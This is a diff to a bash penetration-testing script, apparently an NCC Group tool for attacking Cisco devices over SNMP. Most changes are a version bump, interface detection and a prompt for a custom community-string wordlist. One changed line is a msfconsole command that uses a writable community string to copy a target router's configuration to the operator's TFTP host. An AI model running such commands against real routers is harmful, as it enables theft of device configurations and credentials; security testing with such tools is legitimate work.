@@ -6,8 +6,8 @@
 # Twitter = @commonexploits
 # 29/05/2012
 # Requires metasploit, snmpwalk and john the ripper - suggest backtrack as built in (tested on BT5)
-VERSION="1.8" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See README for details
-# updated 03/09/2015 by Jason Soto, jason_soto at jsitech dot com - SEE README
+VERSION="1.9" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See README for details
+# updated 12/29/2015 by Jason Soto, jason_soto at jsitech dot com - SEE README
 
 #####################################################################################
 # Released as open source by NCC Group Plc - http://www.nccgroup.com/
@@ -32,7 +32,7 @@ JOHNDIR="/usr/sbin/" #john location on BT.
 JOHNPASS="/usr/share/john/" #Location john password file
 THREADS="10" #metasploit threads to use
 JOHNWAIT="300" #seconds for john ripper to sleep whilst trying quick dictionary attack
-MYINT="eth0" # your local network interface, it assume is eth0. Only used to read your IP address for info.
+MYINT=`ip route get 1 | awk '{print $5;exit}'` # your local network interface, Only used to read your IP address for info.
 
 clear
 
@@ -99,22 +99,49 @@ else
         echo -e "\e[00;31mUnable to find the required screen program, script can continue but won't be able to crack any MD5 passwords\e[00m"
 fi
 
-#Check for default community string file
-if [ -f $COM_PASS1 ]
-    then
-        COM_PASS=$COM_PASS1
-        echo ""
-        echo -e "\e[00;32mI have found the community strings file\e[00m"
-    elif [ -f $COM_PASS2 ]
-        then
-            COM_PASS=$COM_PASS2
-            echo ""
-            echo -e "\e[00;32mI have found the community strings file\e[00m"
-    else
-        echo ""
-        echo -e "\e[00;31mUnable to find the community strings file\e[00m"
-        exit 1
-fi
+#Check for default community string file or supply custom community string file
+
+echo ""
+echo -e "\e[1;33m------------------------------------------------------\e[00m"
+echo "Please Specify the community string file to use"
+echo -e "\e[1;33m-------------------------------------------------------\e[00m"
+echo ""
+echo "1. Use Default SNMP Community String File"
+echo "2. Provide SNMP Community String File"
+echo ""
+echo -ne ">"
+read choice
+
+case $choice in
+
+1)
+  	if [ -f $COM_PASS1 ]
+    		then
+        		COM_PASS=$COM_PASS1
+        		echo ""
+        		echo -e "\e[00;32mI have found the community strings file\e[00m"
+    		else
+        		echo ""
+        		echo -e "\e[00;31mUnable to find the community strings file\e[00m"
+        		exit 1
+				fi
+;;
+
+2)
+			echo "Please Provide the PATH for the SNMP Communit String File"
+      echo ""
+			echo "Example : /usr/share/mysnmpstrings.txt"
+			echo ""
+			echo -ne ">"
+			read COM_PASS
+;;
+
+*)
+			echo "No Community String File Provided, Exiting"
+			exit
+;;
+
+esac
 
 
 echo ""
@@ -463,7 +490,7 @@ echo -e "\e[1;33m---------------------------------------------------------------
 echo "I will download the config now using the writable snmp community of "$WRITCOM1", your network must allow an inbound connection"
 echo ""
 echo "I will need your local IP address. make sure any firewall is disabled as a TFTP inbound connection will be used"
-LOCAL=`ifconfig $MYINT |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }'`
+LOCAL=`ip route get 1 | awk '{print $NF;exit}'`
 echo ""
 fi
 echo -e "I believe your IP address is \e[1;33m"$LOCAL"\e[00m on \e[1;33m"$MYINT"\e[00m but please enter it below to confirm"
@@ -473,7 +500,7 @@ clear
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
 echo "Now attempting to download the router config file, please wait"
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
-msfconsole -x "auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS $CISCOIP; set LHOST $LOCALIP; set COMMUNITY $WRITCOM1; set OUTPUTDIR $OUTPUTDIR; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" >/dev/null 2>&1
+msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS $CISCOIP; set LHOST $LOCALIP; set COMMUNITY $WRITCOM1; set OUTPUTDIR $OUTPUTDIR; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" >/dev/null 2>&1
 cat "$OUTPUTDIR$CISCOIP.txt" >/dev/null 2>&1
 if [ $? = 1 ]
 then
